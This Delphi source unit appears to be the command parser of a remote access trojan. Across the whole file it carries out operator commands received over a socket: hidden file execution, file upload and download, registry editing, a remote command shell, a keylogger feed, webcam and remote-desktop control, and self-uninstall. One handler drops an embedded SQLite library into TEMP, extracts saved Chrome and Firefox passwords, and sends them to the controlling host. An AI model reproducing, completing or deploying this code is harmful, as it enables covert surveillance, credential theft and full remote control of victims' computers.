unit uParser;

interface
uses
  uCommands, windows, uFilemanager, uFunctions, uProcessmanager,
  uWindow, uService, uScreenshot, winsock, uRegistry, uRemoteShell,uInstallation,
  socketunit, sysutils;
procedure ParseCommand(sSocket:TClientSocket);
Procedure StripOutParam(Text: String; VAR Param: Array of String);

implementation
uses uConnection,
     pwChrome,
     pwFirefox,
     shcSQLite,
     Classes;
Procedure StripOutCmd(Text: String; VAR Cmd: String);
Begin Cmd := Copy(Text, 1, Pos('|', Text)-1); End;

Procedure StripOutParam(Text: String; VAR Param: Array of String);
Var
  I: Word;
Begin
  If Text = '' Then Exit;
  FillChar(Param, SizeOf(Param), 0);
  Delete(Text, 1, Pos('|', Text));
  If Text = '' Then Exit;
  If (Text[Length(Text)] <> '|') Then Text := Text + '|';
  I := 0;
  While (Pos('|', Text) > 0) Do
  Begin
    Param[I] := Copy(Text, 1, Pos('|', Text)-1);
    Inc(I);
    Delete(Text, 1, Pos('|', Text));
    If (I >= 100) Then Break;
  End;
End;

procedure ParseCommand(sSocket:TClientSocket);
var
  sData, sBuff, sFullData, sString:String;
  bPackInfos:TPacketInformation;
  Param: Array[0..100]of String;
  pointerInfo:Pointer;
  cThread:Cardinal;
  lRecvLen:Integer;
  sComm:Byte;
  arrBuffer:array[0..4095] of Byte;
  xMS:TMemoryStream;
  xFN:string;
begin
  repeat
    try
      sFullData := '';
      ZeroMemory(@arrBuffer[0], 4096);
      lRecvLen := sSocket.ReceiveBuffer(arrBuffer[0],4096);
      if sSocket.Connected = false then break;
      SetLength(sBuff,lRecvLen);
      MoveMemory(@sBuff[1],@arrBuffer[0],lRecvLen);
      sFullData := sFullData + sBuff;
      repeat
        bPackInfos := VerifyPacket(sFullData);
        sFullData := bPackInfos.PacketLeft;
        sString := bPackInfos.PacketCommand;
        sComm := bPackInfos.PacketByte;
        if bPackInfos.PacketFinished = False then
          break;
        case sComm of
          PACK_RESTART:sSocket.Disconnect;
          PACK_CLOSE:ExitProcess(0);
          PACK_UNINSTALL:Uninstall;
          PACK_PING:SendPacket(sSocket,PACK_PONG,'');
          PACK_GETDRIVES:
            begin
              sData := GetDrives;
              SendPacket(sSocket,PACK_GETDRIVES, sData);
            end;
          PACK_GETDIRS:
            begin
              sData := ListFileDir(sString,True);
              SendPacket(sSocket,PACK_GETDIRS, sData);
              Sleep(100);
              sData := ListFileDir(sString,False);
              SendPacket(sSocket,PACK_GETFILES, sData);
            end;
          PACK_EXECUTEFILEVISIBLE:
            begin
              If ExecuteFile(sString, True) then
                sData := '1'
              else
                sData := '0';
              SendPacket(sSocket,PACK_EXECUTEFILEVISIBLE, sData);
            end;
          PACK_EXECUTEFILEHIDDEN:
            begin
              If ExecuteFile(sString, False) then
                sData := '1'
              else
                sData := '0';
              SendPacket(sSocket,PACK_EXECUTEFILEVISIBLE, sData);
            end;
          PACK_DELETEFILE:
            begin
              If DeleteFile(Pchar(sString)) then
                sData := '1'
              else
                sData := '0';
              SendPacket(sSocket,PACK_DELETEFILE, sData);
            end;
          PACK_MOVEFILE:
            begin
              StripOutParam(sString,Param);
              If altMoveFile(Param[0],Param[1],Param[2]) then
                sData := '1'
              else
                sData := '0';
              SendPacket(sSocket,PACK_MOVEFILE, sData);
            end;
          PACK_COMPRESSEDTRANSFERFILE:
            begin
              StripOutParam(sString,Param);
              If FileExists(Param[0]) = false then
                sString := Param[1] + '|' + Param[2] + '|' + Inttostr(0)
              else
                sString := Param[1] + '|' + Param[2] + '|' + Inttostr(GetFileSize(Param[0]));
              GetMem(pointerInfo,SizeOf(TInfo));
              PInfo(pointerInfo)^.scHost := sHost;
              PInfo(pointerInfo)^.scPort := SET_INT_PORT;
              PInfo(pointerInfo)^.scData := sString;
              PInfo(pointerInfo)^.scPackHead := PACK_QUERYCOMPRESSEDFILE;
              BeginThread(NIL, 0, @DoConnectionJob, pointerInfo, 0, cThread);
            end;
          PACK_TRANSFERFILE:
            begin
              StripOutParam(sString,Param);
              If FileExists(Param[0]) = false then
                sString := Param[1] + '|' + Param[2] + '|' + Inttostr(0)
              else
                sString := Param[1] + '|' + Param[2] + '|' + Inttostr(GetFileSize(Param[0]));
              GetMem(pointerInfo,SizeOf(TInfo));
              PInfo(pointerInfo)^.scHost := sHost;
              PInfo(pointerInfo)^.scPort := SET_INT_PORT;
              PInfo(pointerInfo)^.scData := sString;
              PInfo(pointerInfo)^.scPackHead := PACK_QUERYFILE;
              BeginThread(NIL, 0, @DoConnectionJob, pointerInfo, 0, cThread);
            end;
          PACK_UPLOADFILE:
            begin
              StripOutParam(sString,Param);
              sString := Param[0] + '|' + Param[1] + '|';
              GetMem(pointerInfo,SizeOf(TInfo));
              PInfo(pointerInfo)^.scHost := sHost;
              PInfo(pointerInfo)^.scPort := SET_INT_PORT;
              PInfo(pointerInfo)^.scData := sString;
              PInfo(pointerInfo)^.scPackHead := PACK_UPLOADFILE;
              BeginThread(NIL, 0, @DoConnectionJob, pointerInfo, 0, cThread);
            end;
          PACK_PROCESSES:
            begin
              sData := ListProcess;
              SendPacket(sSocket,PACK_PROCESSES, sData);
            end;
          PACK_TERMINATEPROCESS:
            begin
              If TerminateProcessbyPID(StrToInt(sString)) then
                sData := '1'
              else
                sData := '0';
              SendPacket(sSocket,PACK_TERMINATEPROCESS, sData);
            end;
          PACK_ENUMWINDOW:
            begin
              sData := GetWindows;
              SendPacket(sSocket,PACK_ENUMWINDOW, sData);
            end;
          PACK_WINDOWMAX:
            begin
              WindowMaximize(StrToInt(sString));
              sData := '1';
              SendPacket(sSocket,PACK_WINDOWMAX, sData);
            end;
          PACK_WINDOWMIN:
            begin
              WindowMinimize(StrToInt(sString));
              sData := '1';
              SendPacket(sSocket,PACK_WINDOWMIN, sData);
            end;
          PACK_WINDOWCLOSE:
            begin
              CloseWindow(StrToInt(sString));
              sData := '1';
              SendPacket(sSocket,PACK_WINDOWMIN, sData);
            end;
          PACK_ENUMSERVICE:
            begin
              sData := ServiceList;
              SendPacket(sSocket,PACK_ENUMSERVICE, sData);
            end;
          PACK_STARTSERVICE:
            begin
              ServiceStatus(sString,true,true);
              sData := '1';
              SendPacket(sSocket,PACK_STARTSERVICE, sData);
            end;
          PACK_STOPSERVICE:
            begin
              ServiceStatus(sString,true,false);
              sData := '1';
              SendPacket(sSocket,PACK_STOPSERVICE, sData);
            end;
          PACK_REQUESTVNC:
            begin
              StripOutParam(sString,Param);
              sString := Param[0] + '|' + GetSymetrics;
              GetMem(pointerInfo,SizeOf(TInfo));
              PInfo(pointerInfo)^.scHost := sHost;
              PInfo(pointerInfo)^.scPort := SET_INT_PORT;
              PInfo(pointerInfo)^.scData := sString;
              PInfo(pointerInfo)^.scPackHead := PACK_VNCSOCKET;
              BeginThread(NIL, 0, @DoConnectionJob, pointerInfo, 0, cThread);
            end;
          PACK_KEYLOGREQUEST:
            begin
              sString := sString;
              GetMem(pointerInfo,SizeOf(TInfo));
              PInfo(pointerInfo)^.scHost := sHost;
              PInfo(pointerInfo)^.scPort := SET_INT_PORT;
              PInfo(pointerInfo)^.scData := sString;
              PInfo(pointerInfo)^.scPackHead := PACK_KEYLOGSEND;
              BeginThread(NIL, 0, @DoConnectionJob, pointerInfo, 0, cThread);
            end;
          PACK_ENUMKEYS:
            begin
              sData := ListKeys(sString);
              SendPacket(sSocket,PACK_ENUMKEYS,sData);
              Sleep(100);
              sData := ListValues(sString);
              SendPacket(sSocket,PACK_ENUMVALUES,sData);
            end;
          PACK_SHELLSTART:
            begin
              StartCMDThread(sSocket);
            end;
          PACK_SHELLDATA:
            begin
              RemoteShellWriteData(sString + #13 +#10);
            end;
          PACK_REGADD:
            begin
              StripOutParam(sString,Param);
              If AddRegValue(param[0],param[2],param[1]) then
                sData := '1'
              else
                sData := '0';
              SendPacket(sSocket,PACK_REGADD, sData);
            end;
          PACK_REGDELETE:
            begin
              If DeleteRegKey(sString) then
                sData := '1'
              else
                sData := '0';
              SendPacket(sSocket,PACK_REGDELETE, sData);
            end;
          PACK_REGRENAME:
            begin
              StripOutParam(sString,Param);
              If RenameRegistryItem(param[0],param[1]) then
                sData := '1'
              else
                sData := '0';
              SendPacket(sSocket,PACK_REGRENAME, sData);
            end;
          PACK_CAMSOCKET:
            begin
              GetMem(pointerInfo,SizeOf(TInfo));
              PInfo(pointerInfo)^.scHost := sHost;
              PInfo(pointerInfo)^.scPort := SET_INT_PORT;
              PInfo(pointerInfo)^.scData := sString;
              PInfo(pointerInfo)^.scPackHead := PACK_CAMSOCKET;
              BeginThread(NIL, 0, @DoConnectionJob, pointerInfo, 0, cThread);
            end;
          PACK_SHORTCUT:
            begin
              if sString = '0' then
                sData := GetDesktopFolder
              else
                sData := GetDocumentsFolder;
              if sData <> '' then
                SendPacket(sSocket,PACK_SHORTCUT, sData);
            end;
          PACK_VNCKEY:
            begin
              writeKeys(sString);
            end;
          PACK_VNCLEFT:
            begin
              StripOutParam(sString,Param);
              SetCursorPos(StrToInt(param[0]), StrToInt(param[1]));
              mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
              mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
            end;
          PACK_VNCRIGHT:
            begin
              StripOutParam(sString,Param);
              SetCursorPos(StrToInt(param[0]), StrToInt(param[1]));
              mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
              mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
            end;
          PACK_DIRCREATE:
            begin
              If CreateDir(sString) then
                SendPacket(sSocket,PACK_DIRCREATE, '1')
              else
                SendPacket(sSocket,PACK_DIRCREATE, '0')
            end;
          PACK_DIRDELETE:
            begin
              if DelTree(sString) then
                SendPacket(sSocket,PACK_DIRDELETE, '1')
              else
                SendPacket(sSocket,PACK_DIRDELETE, '0')
            end;
          PACK_DIRRENAME:
            begin
              StripOutParam(sString,Param);
              If altMoveFile(Param[0],Param[1],Param[2]) then
                sData := '1'
              else
                sData := '0';
              SendPacket(sSocket,PACK_DIRRENAME, sData);
            end;
          PACK_GETPASSWD:
            begin
              xFN:=GetEnvironmentVariable('TEMP')+'\sqlite3.dll';
              if (not FileExists(xFN)) then begin
               xMS:=TMemoryStream.Create;
               xMS.WriteBuffer(SQLarr, Length(SQLarr));
               xMS.Position:=0;
               xMS.SaveToFile(xFN);
               xMS.Free;
              end;
              //
              sData:=GetChromePass(xFN, '#')+GetFFPass(xFN, '#')+#10;
              SendPacket(cSocket,PACK_GETPASSWD,sData);
              xFN:='';
              sBuff:='';
              end;

        end;
      until sFullData = '';
    except
    end;
  until 1 = 3;
end;
end.
